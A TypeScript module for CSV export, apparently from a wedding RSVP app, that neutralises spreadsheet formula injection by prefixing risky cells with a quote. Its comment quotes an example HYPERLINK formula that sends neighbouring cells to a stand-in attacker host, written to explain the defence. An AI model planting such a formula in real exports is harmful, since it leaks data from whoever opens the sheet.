/**
 * Minimal, correct CSV serialisation (RFC 4180 quoting) — plus a guard RFC
 * 4180 does not give you.
 *
 * M3: a cell beginning with = + - @ (or tab/CR) is a FORMULA to Excel,
 * Sheets and LibreOffice. Quoting does not help: the parser strips the quotes
 * and hands the spreadsheet `=HYPERLINK("https://evil.tld?d="&A1,"Click")`,
 * which happily exfiltrates the neighbouring cells on click.
 *
 * This is reachable by people who are not the customer. RSVP questions default
 * to type 'text' (0002) and migration 0019 validates options only for the
 * choice types, so a guest's free-text answer lands verbatim in rsvps.csv —
 * the file the export route describes as "the sheet a couple hands to their
 * caterer". csvResponse also emits a BOM, which makes Excel open it directly
 * rather than through the import wizard that would have shown them the text.
 *
 * The fix is the standard one: prefix a single quote, which spreadsheets treat
 * as "this cell is literally text" and do not display.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/

export function toCsv(headers: string[], rows: (string | number | boolean | null | undefined)[][]): string {
  const cell = (v: string | number | boolean | null | undefined) => {
    let s = v == null ? '' : String(v)
    // Numbers and booleans are ours, not user input — but they stringify to
    // things like "-3", so only defuse values that arrived as strings.
    if (typeof v === 'string' && FORMULA_LEAD.test(s)) s = `'${s}`
    return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
  }
  return [headers, ...rows].map((r) => r.map(cell).join(',')).join('\r\n')
}

export function csvResponse(filename: string, csv: string): Response {
  return new Response(`﻿${csv}`, {
    headers: {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': `attachment; filename="${filename}"`,
    },
  })
}
